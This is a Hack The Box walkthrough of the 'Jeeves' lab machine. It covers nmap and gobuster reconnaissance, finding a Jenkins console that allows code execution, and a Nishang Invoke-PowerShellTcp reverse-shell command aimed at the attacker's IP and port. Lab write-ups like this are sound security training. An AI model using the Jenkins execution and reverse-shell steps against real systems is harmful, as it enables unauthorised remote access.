# Hack the Box - Jeeves

```CSS
Machine IP: 10.10.10.63
```

## NMAP

```CSS
▶ nmap -Pn -sS -p- 10.10.10.63 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.63
Host is up (0.18s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 126.42 seconds
```

```CSS
▶ nmap -sC -sV -p 80,135,445,50000 10.10.10.63 -oN deep.nmap 

Nmap scan report for 10.10.10.63
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-05T11:01:04
|_  start_date: 2023-05-05T10:53:38
|_clock-skew: mean: 4h59m36s, deviation: 0s, median: 4h59m35s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.18 seconds
```

## HTTP 80
![image](https://user-images.githubusercontent.com/83878909/236389498-19f90e31-9c0d-4d9a-a46d-412576e533ed.png)

## HTTP 50000
![image](https://user-images.githubusercontent.com/83878909/236389674-c5e1bd6b-986d-46fd-b722-774f68fc85b2.png)

## Content Discovery
```CSS
▶ gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25 -o http50000.gobuster
```
![image](https://user-images.githubusercontent.com/83878909/236398246-f2078de0-b176-4b58-ad55-50c921f36af9.png)

### Jenkins
![image](https://user-images.githubusercontent.com/83878909/236398469-e3cc9985-d477-4eb1-ad5d-c2158413b1a3.png)

## Initial Foothold
### Jenkins Code Execution
![image](https://user-images.githubusercontent.com/83878909/236399568-d5c3513a-e53a-4eb0-ad52-78b57a826a65.png)
![image](https://user-images.githubusercontent.com/83878909/236399923-36a48d06-d4bf-4f21-bbbd-774488412b38.png)
![image](https://user-images.githubusercontent.com/83878909/236400279-596d3aac-959f-4467-8461-edf489fdb014.png)

### Reverse Shell (Nishang)
```CSS
Invoke-PowerShellTcp.ps1
```
  - Add the below line to the end of the nishang script to call the function `Invoke-PowerShellTcp`.
```CSS
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 1337
```
![image](https://user-images.githubusercontent.com/83878909/236402506-7d9ab4a3-c03b-4f9a-95df-9919a096fab8.png)
